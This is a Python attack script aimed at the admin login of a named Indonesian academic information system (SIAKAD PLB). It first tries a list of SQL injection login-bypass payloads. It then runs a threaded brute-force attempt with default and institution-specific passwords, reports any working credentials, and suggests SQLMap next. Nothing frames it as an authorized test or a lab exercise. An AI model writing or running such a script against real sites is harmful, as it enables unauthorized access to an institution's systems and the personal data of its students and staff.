#!/usr/bin/env python3
import requests
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

# Target URL
url = "https://siakad.plb.ac.id/adm/config.php"

# Common credentials untuk sistem akademik Indonesia
credentials = [
    ("admin", "admin"),
    ("admin", "admin123"),
    ("admin", "password"),
    ("admin", "12345678"),
    ("administrator", "administrator"),
    ("administrator", "admin123"),
    ("root", "root"),
    ("root", "toor"),
    ("siakad", "siakad"),
    ("siakad", "siakad123"),
    ("plb", "plb123"),
    ("admin", "plb2024"),
    ("admin", "plb2025"),
    ("admin", "plb2026"),
    ("superadmin", "superadmin"),
    ("sysadmin", "sysadmin123"),
    ("administrator", "password"),
    ("admin", "Admin123"),
    ("admin", "Admin@123"),
    ("admin", "Plb@2026"),
]

# SQL Injection payloads
sqli_payloads = [
    ("admin' OR '1'='1", "anything"),
    ("admin' OR '1'='1'--", ""),
    ("admin' OR '1'='1'#", ""),
    ("' OR ''='", "' OR ''='"),
    ("admin'--", ""),
    ("admin' #", ""),
    ("' or 1=1--", ""),
    ("' or 1=1#", ""),
    ("' or 1=1/*", ""),
    ("') or '1'='1--", ""),
    ("') or ('1'='1--", ""),
    ("1' or '1' = '1", "1' or '1' = '1"),
    ("admin' or '1'='1'/*", ""),
]

def try_login(username, password):
    try:
        data = {
            'username': username,
            'password': password,
            'btnlog': ''
        }
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        
        response = requests.post(url, data=data, headers=headers, timeout=10, allow_redirects=False)
        
        # Cek redirect atau success indicators
        if response.status_code == 302 or response.status_code == 301:
            location = response.headers.get('Location', '')
            if 'dashboard' in location.lower() or 'home' in location.lower() or 'index' in location.lower():
                return True, username, password, f"REDIRECT: {location}"
        
        # Cek content
        if 'dashboard' in response.text.lower() or 'berhasil' in response.text.lower():
            return True, username, password, "SUCCESS IN CONTENT"
        
        # Cek jika tidak ada alert error
        if 'alert' not in response.text.lower() and 'login' not in response.text.lower():
            return True, username, password, "NO ERROR ALERT"
            
        return False, username, password, None
        
    except Exception as e:
        return False, username, password, f"ERROR: {str(e)}"

print("[*] Starting brute force attack on SIAKAD PLB...")
print(f"[*] Target: {url}")
print(f"[*] Total attempts: {len(credentials) + len(sqli_payloads)}\n")

success_found = False

# Try SQL Injection first
print("[+] Trying SQL Injection payloads...")
for username, password in sqli_payloads:
    result, user, pwd, msg = try_login(username, password)
    if result:
        print(f"\n[!!!] SQLI SUCCESS [!!!]")
        print(f"Username: {user}")
        print(f"Password: {pwd}")
        print(f"Info: {msg}")
        success_found = True
        break
    else:
        print(f"[-] SQLI Failed: {user[:30]}")
    time.sleep(0.5)

if not success_found:
    print("\n[+] Trying common credentials...")
    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = {executor.submit(try_login, user, pwd): (user, pwd) for user, pwd in credentials}
        
        for future in as_completed(futures):
            result, username, password, msg = future.result()
            if result:
                print(f"\n[!!!] CREDENTIALS FOUND [!!!]")
                print(f"Username: {username}")
                print(f"Password: {password}")
                print(f"Info: {msg}")
                success_found = True
                break
            else:
                print(f"[-] Failed: {username}/{password}")
            time.sleep(0.3)

if not success_found:
    print("\n[!] No valid credentials found in common list.")
    print("[*] Recommendation: Use SQLMap or custom wordlist")
